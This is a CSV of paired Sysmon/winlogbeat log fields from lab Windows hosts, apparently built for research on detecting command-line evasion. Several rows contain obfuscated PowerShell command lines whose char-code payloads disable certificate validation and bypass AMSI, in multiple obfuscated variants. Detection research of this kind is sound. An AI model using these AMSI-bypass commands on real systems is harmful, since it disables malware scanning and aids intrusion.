Pair Index,Match Cmd,Evasion Cmd,Equivalent
1348,"{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'client3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'client3'}","{'hostname': 'client3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'client3', 'type': 'winlogbeat', 'version': '7.10.2'}",False
1349,"{'entity_id': '{19fc45ac-74fe-601c-0000-00106b4b0200}', 'pid': 1128, 'executable': 'c:\\windows\\system32\\userinit.exe', 'working_directory': 'c:\\windows\\system32\\', 'name': 'userinit.exe', 'args': ['c:\\windows\\system32\\userinit.exe'], 'hash': {'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}, 'command_line': 'powershell.exe -exec bypass -noni -nop -w 1 -c "" & ( $shellid[1]+$shellid[13]+\'x\')("" $( sv \'ofs\' \'\' ) ""+ [string][char[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( set-item \'variable:ofs\' \' \')"" )""', 'parent': {'entity_id': '{19fc45ac-74f6-601c-0000-0010945c0000}', 'pid': 384, 'executable': 'c:\\windows\\system32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}}","{'parent': {'pid': 440, 'executable': 'c:\\windows\\system32\\services.exe', 'command_line': 'c:\\windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['c:\\windows\\system32\\services.exe'], 'entity_id': '{19fc45ac-76e7-601c-0000-001081630000}'}, 'entity_id': '{19fc45ac-b7ad-601c-0000-00108cff2800}', 'command_line': 'powershell -exec bypass -noni -nop -w 1 -c "" & ( $shellid[1]+$shellid[13]+\'x\')("" $( sv \'ofs\' \'\' ) ""+ [string][char[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( set-item \'variable:ofs\' \' \')"" )""', 'working_directory': 'c:\\windows\\system32\\', 'name': 'taskhost.exe', 'args': ['taskhost.exe', '$(arg0)'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'pid': 2828, 'executable': 'c:\\windows\\system32\\taskhost.exe'}",False
1350,2021-02-04t22:28:14.578z,2021-02-04t22:28:19.828z,False
1351,"{'kind': 'event', 'code': 1, 'provider': 'microsoft-windows-sysmon', 'action': 'process create (rule: processcreate)', 'created': '2021-02-04t22:31:13.052z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}","{'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'microsoft-windows-sysmon', 'action': 'process create (rule: processcreate)', 'created': '2021-02-04t22:31:13.054z', 'module': 'sysmon'}",False
1352,c:\windows\system32\userinit.exe,taskhost.exe system,False
1353,"{'user': 'setup', 'hash': ['61ac3efdfacfdd3f0f11dd4fd4044223', '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b']}","{'user': 'system', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}",False
1354,"{'computer_name': 'client3', 'user': {'identifier': 's-1-5-18', 'name': 'system', 'domain': 'nt authority', 'type': 'user'}, 'version': 5, 'process': {'pid': 1516, 'thread': {'id': 1780}}, 'channel': 'microsoft-windows-sysmon/operational', 'task': 'process create (rule: processcreate)', 'event_id': 1, 'provider_name': 'microsoft-windows-sysmon', 'record_id': 1230, 'opcode': 'info', 'api': 'wineventlog', 'provider_guid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'event_data': {'product': 'microsoft® windows® operating system', 'logonguid': '{19fc45ac-74fe-601c-0000-0020fd380200}', 'terminalsessionid': '1', 'fileversion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'description': 'userinit logon application', 'originalfilename': 'userinit.exe', 'integritylevel': 'high', 'company': 'microsoft corporation', 'logonid': '0x238fd'}}","{'event_data': {'fileversion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'logonguid': '{19fc45ac-74f7-601c-0000-0020e7030000}', 'logonid': '0x3e7', 'terminalsessionid': '0', 'product': 'microsoft® windows® operating system', 'originalfilename': 'taskhost.exe', 'description': 'host process for windows tasks', 'integritylevel': 'system', 'company': 'microsoft corporation'}, 'provider_guid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'process': {'pid': 1516, 'thread': {'id': 1780}}, 'channel': 'microsoft-windows-sysmon/operational', 'event_id': 1, 'version': 5, 'user': {'domain': 'nt authority', 'type': 'user', 'identifier': 's-1-5-18', 'name': 'system'}, 'task': 'process create (rule: processcreate)', 'computer_name': 'client3', 'api': 'wineventlog', 'opcode': 'info', 'provider_name': 'microsoft-windows-sysmon', 'record_id': 1244}",False
1355,"{'domain': 'client3', 'name': 'setup'}","{'domain': 'nt authority', 'name': 'system'}",False
1356,"{'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}","{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}",False
1357,"{'entity_id': '{19fc45ac-74fe-601c-0000-00106b4b0200}', 'pid': 1128, 'executable': 'c:\\windows\\system32\\userinit.exe', 'working_directory': 'c:\\windows\\system32\\', 'name': 'userinit.exe', 'args': ['c:\\windows\\system32\\userinit.exe'], 'hash': {'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}, 'command_line': 'powershell.exe -exec bypass -noni -nop -w 1 -c "" & ( $shellid[1]+$shellid[13]+\'x\')("" $( sv \'ofs\' \'\' ) ""+ [string][char[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( set-item \'variable:ofs\' \' \')"" )""', 'parent': {'entity_id': '{19fc45ac-74f6-601c-0000-0010945c0000}', 'pid': 384, 'executable': 'c:\\windows\\system32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}}","{'name': 'taskhost.exe', 'args': ['taskhost.exe', 'system'], 'entity_id': '{19fc45ac-7503-601c-0000-0010ec040300}', 'executable': 'c:\\windows\\system32\\taskhost.exe', 'command_line': 'powershell.exe -exec bypass -noni -nop -w 1 -c ""-join( \'91}78the exclusive semaphore is owned by another process.%%116%%46>83~101m114x118>105_99~101>80&111>105x110x116~77&97x110z97~103&101x114>93x58~58x83>101_114~118&101m114_67x101m114z116m105~102&105m99z97m116}101z86x97~108~105%%100%%97}116_105%%111}110%%67m97x108%%108%%98m97%%99>107&32m61&32~123%%36&116~114~117&101~125_10_116m114z121m123~10_91z82}101}102m93}46&65~115&115z101>109m98z108_121z46~71>101x116z84}121_112m101%%40%%39%%83_121&115_39x43}39~116>101x109_46x77z97z110}39>43_39z97~103~101}109>101&110>116}46&65~117_116}39~43~39}111~109>97~116z105z111x110x46m65}109x39&43~39_115>105~85m116~39z43x39~105x108z115z39_41&46%%71~101}116~70~105~101x108%%100}40z39~97&109>39x43>39~115m105x73x110x105>39z43}39&116_70_97}105}108z101m100x39&44m32}39&78%%111~110&80&39&43x39x117x98%%108~105~99_44~83_116m97z39&43>39}116}105%%99%%39>41&46~83&101m116_86~97%%108&117~101}40&36~110~117m108&108z44_32&36z116}114&117x101&41z10m125&99}97}116>99%%104_123}125_10}36m80~83_86>101&114~115x105&111>110x84&97&98}108z101\'.spl""""it( \'~_x}%%~mz>&\' )| foreach{ ( [int]$_ -as[char]) }) |& ( $pshome[4] + $pshome[30]+\'x\')"" ', 'working_directory': 'c:\\windows\\system32\\', 'parent': {'pid': 444, 'executable': 'c:\\windows\\system32\\services.exe', 'command_line': 'c:\\windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['c:\\windows\\system32\\services.exe'], 'entity_id': '{19fc45ac-74f7-601c-0000-0010fe630000}'}, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'pid': 2504}",False
1358,2021-02-04t22:28:14.578z,2021-02-04t22:36:13.140z,False
1359,"{'kind': 'event', 'code': 1, 'provider': 'microsoft-windows-sysmon', 'action': 'process create (rule: processcreate)', 'created': '2021-02-04t22:31:13.052z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}","{'action': 'process create (rule: processcreate)', 'created': '2021-02-04t22:38:22.767z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'microsoft-windows-sysmon'}",False
1360,"{'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'client3', 'architecture': 'x86', 'name': 'client3', 'os': {'family': 'windows', 'name': 'windows 7 professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'os': {'name': 'windows 7 professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'client2', 'architecture': 'x86', 'name': 'client2.breach.local'}",False
1361,c:\windows\system32\userinit.exe,c:\windows\sysmon.exe,False
1362,"{'user': 'setup', 'hash': ['61ac3efdfacfdd3f0f11dd4fd4044223', '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b']}","{'user': 'system', 'hash': ['c2f59c783a26dd480bafcc9955a99f42', '8c50ce44732912726e5ab0958e4199deee77f904cd746369f37b91e67a9826c6']}",False
1363,"{'computer_name': 'client3', 'user': {'identifier': 's-1-5-18', 'name': 'system', 'domain': 'nt authority', 'type': 'user'}, 'version': 5, 'process': {'pid': 1516, 'thread': {'id': 1780}}, 'channel': 'microsoft-windows-sysmon/operational', 'task': 'process create (rule: processcreate)', 'event_id': 1, 'provider_name': 'microsoft-windows-sysmon', 'record_id': 1230, 'opcode': 'info', 'api': 'wineventlog', 'provider_guid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'event_data': {'product': 'microsoft® windows® operating system', 'logonguid': '{19fc45ac-74fe-601c-0000-0020fd380200}', 'terminalsessionid': '1', 'fileversion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'description': 'userinit logon application', 'originalfilename': 'userinit.exe', 'integritylevel': 'high', 'company': 'microsoft corporation', 'logonid': '0x238fd'}}","{'channel': 'microsoft-windows-sysmon/operational', 'provider_guid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'user': {'identifier': 's-1-5-18', 'name': 'system', 'domain': 'nt authority', 'type': 'user'}, 'event_id': 1, 'provider_name': 'microsoft-windows-sysmon', 'record_id': 1356, 'opcode': 'info', 'process': {'pid': 1704, 'thread': {'id': 1804}}, 'event_data': {'originalfilename': '?', 'integritylevel': 'system', 'logonguid': '{19fc45ac-76d8-601c-0000-0020e7030000}', 'product': 'sysinternals sysmon', 'description': 'system activity monitor', 'logonid': '0x3e7', 'company': 'sysinternals - www.sysinternals.com', 'terminalsessionid': '0', 'fileversion': '10.41'}, 'task': 'process create (rule: processcreate)', 'api': 'wineventlog', 'computer_name': 'client2.breach.local', 'version': 5}",False
1364,"{'domain': 'client3', 'name': 'setup'}","{'domain': 'nt authority', 'name': 'system'}",False
1365,"{'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}","{'md5': 'c2f59c783a26dd480bafcc9955a99f42', 'sha256': '8c50ce44732912726e5ab0958e4199deee77f904cd746369f37b91e67a9826c6'}",False
1366,"{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'client3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'client3'}","{'version': '7.10.2', 'hostname': 'client2', 'ephemeral_id': 'd5d7daa0-c0ba-4d39-9140-3b4a4308a222', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'client2', 'type': 'winlogbeat'}",False
1367,"{'entity_id': '{19fc45ac-74fe-601c-0000-00106b4b0200}', 'pid': 1128, 'executable': 'c:\\windows\\system32\\userinit.exe', 'working_directory': 'c:\\windows\\system32\\', 'name': 'userinit.exe', 'args': ['c:\\windows\\system32\\userinit.exe'], 'hash': {'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}, 'command_line': 'powershell.exe -exec bypass -noni -nop -w 1 -c "" & ( $shellid[1]+$shellid[13]+\'x\')("" $( sv \'ofs\' \'\' ) ""+ [string][char[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( set-item \'variable:ofs\' \' \')"" )""', 'parent': {'entity_id': '{19fc45ac-74f6-601c-0000-0010945c0000}', 'pid': 384, 'executable': 'c:\\windows\\system32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}}","{'working_directory': 'c:\\windows\\system32\\', 'name': 'sysmon.exe', 'args': ['c:\\windows\\sysmon.exe'], 'hash': {'md5': 'c2f59c783a26dd480bafcc9955a99f42', 'sha256': '8c50ce44732912726e5ab0958e4199deee77f904cd746369f37b91e67a9826c6'}, 'entity_id': '{19fc45ac-76dd-601c-0000-001067490100}', 'pid': 1704, 'executable': 'c:\\windows\\sysmon.exe', 'command_line': 'powershell.exe -exec bypass -noni -nop -w 1 -c ""(\'91y78>101e116;46e83a101s114a118;105;99d101;80e111;105a110h116}77a97d110s97s103}101s114s93>58>58y83h101s114s118h101y114y67y101a114>116;105e102;105;99h97e116;101y86a97}108}105h100s97h116;105h111y110;67h97;108a108y98e97h99>107y32;61>32a123;36e116a114;117s101}125y10a116}114;121s123d10s91a82d101;102y93>46a65a115}115e101;109y98h108y121a46d71>101e116d84a121}112;101}40}39;83;121y115;39s43}39;116e101h109y46;77;97s110y39;43y39s97a103;101d109d101;110d116a46y65d117y116d39e43;39>111e109>97a116;105}111>110}46}65a109}39s43h39a115>105e85;116>39}43s39h105h108d115e39}41>46e71}101s116>70;105h101}108a100>40s39e97a109a39a43>39>115;105>73y110e105;39>43a39;116a70}97y105h108;101e100a39;44}32}39}78y111h110s80;39y43;39;117>98y108;105;99>44s83;116d97d39e43>39;116}105h99a39;41s46y83y101>116e86y97;108;117s101y40d36a110d117d108a108e44s32;36a116y114;117e101>41>10}125h99y97h116h99h104s123}125}10y36;80s83;86y101h114;115d105}111y110e84s97s98>108>101\'.split(\'sy;ade;}>h\') | %% {([int]$_-as[char])}) -join\'\'| & ( ([string]$verbosepreference)[1,3] + \'x\'-join\'\')""', 'parent': {'name': 'services.exe', 'args': ['c:\\windows\\system32\\services.exe'], 'entity_id': '{19fc45ac-76d8-601c-0000-0010f1630000}', 'pid': 444, 'executable': 'c:\\windows\\system32\\services.exe', 'command_line': 'c:\\windows\\system32\\services.exe'}}",False
1368,2021-02-04t22:28:08.828z,2021-02-04t22:27:20.234z,False
1369,"{'user': 'system', 'hash': ['866a43013535dc8587c258e43579c764', 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82']}","{'user': 'setup', 'hash': ['60b65f97c12ba30cd36450d376227c02', 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536']}",False
1370,"{'record_id': 1218, 'computer_name': 'client3', 'provider_guid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'event_data': {'fileversion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'description': 'spooler subsystem app', 'terminalsessionid': '0', 'logonguid': '{19fc45ac-74f7-601c-0000-0020e7030000}', 'originalfilename': 'spoolsv.exe', 'company': 'microsoft corporation', 'integritylevel': 'system', 'logonid': '0x3e7', 'product': 'microsoft® windows® operating system'}, 'event_id': 1, 'api': 'wineventlog', 'version': 5, 'channel': 'microsoft-windows-sysmon/operational', 'provider_name': 'microsoft-windows-sysmon', 'task': 'process create (rule: processcreate)', 'opcode': 'info', 'user': {'type': 'user', 'identifier': 's-1-5-18', 'name': 'system', 'domain': 'nt authority'}, 'process': {'pid': 1516, 'thread': {'id': 1780}}}","{'channel': 'microsoft-windows-sysmon/operational', 'event_id': 1, 'user': {'name': 'system', 'domain': 'nt authority', 'type': 'user', 'identifier': 's-1-5-18'}, 'task': 'process create (rule: processcreate)', 'version': 5, 'event_data': {'logonguid': '{19fc45ac-74c5-601c-0000-0020f4ff0000}', 'product': 'nettime', 'terminalsessionid': '1', 'logonid': '0xfff4', 'integritylevel': 'high', 'description': 'network time synchronizer', 'originalfilename': 'nettime.exe', 'fileversion': '3.1.4.220'}, 'computer_name': 'client', 'opcode': 'info', 'provider_guid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'provider_name': 'microsoft-windows-sysmon', 'process': {'pid': 1896, 'thread': {'id': 1392}}, 'record_id': 1175, 'api': 'wineventlog'}",False
1371,"{'code': 1, 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'provider': 'microsoft-windows-sysmon', 'action': 'process create (rule: processcreate)', 'created': '2021-02-04t22:31:13.050z', 'kind': 'event'}","{'provider': 'microsoft-windows-sysmon', 'action': 'process create (rule: processcreate)', 'created': '2021-02-04t22:31:11.356z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1}",False
1372,c:\windows\system32\spoolsv.exe,"""c:\program files\nettime\nettime.exe""",False
1373,"{'working_directory': 'c:\\windows\\system32\\', 'parent': {'entity_id': '{19fc45ac-74f7-601c-0000-0010fe630000}', 'pid': 444, 'executable': 'c:\\windows\\system32\\services.exe', 'command_line': 'c:\\windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['c:\\windows\\system32\\services.exe']}, 'command_line': 'c:\\windows\\explorer.exe /root, ""c:\\windows\\system32\\notepad.exe""', 'name': 'spoolsv.exe', 'args': ['c:\\windows\\system32\\spoolsv.exe'], 'hash': {'md5': '866a43013535dc8587c258e43579c764', 'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82'}, 'entity_id': '{19fc45ac-74f8-601c-0000-00100c0d0100}', 'pid': 1208, 'executable': 'c:\\windows\\system32\\spoolsv.exe'}","{'entity_id': '{19fc45ac-74c8-601c-0000-0010d6800100}', 'pid': 1604, 'command_line': 'c:\\windows\\expl""ore""r.""exe"" /r""oo""t, ""c:\\windows\\system32\\notepad.exe""', 'working_directory': 'c:\\windows\\system32\\', 'name': 'nettime.exe', 'args': ['c:\\program files\\nettime\\nettime.exe'], 'hash': {'md5': '60b65f97c12ba30cd36450d376227c02', 'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536'}, 'executable': 'c:\\program files\\nettime\\nettime.exe', 'parent': {'executable': 'c:\\windows\\explorer.exe', 'command_line': 'c:\\windows\\explorer.exe', 'name': 'explorer.exe', 'args': ['c:\\windows\\explorer.exe'], 'entity_id': '{19fc45ac-74c6-601c-0000-0010e21b0100}', 'pid': 1292}}",False
1374,"{'domain': 'nt authority', 'name': 'system'}","{'domain': 'client', 'name': 'setup'}",False
1375,"{'md5': '866a43013535dc8587c258e43579c764', 'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82'}","{'md5': '60b65f97c12ba30cd36450d376227c02', 'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536'}",False
1376,"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'client3', 'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'client3'}","{'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'client2', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'client2'}",False
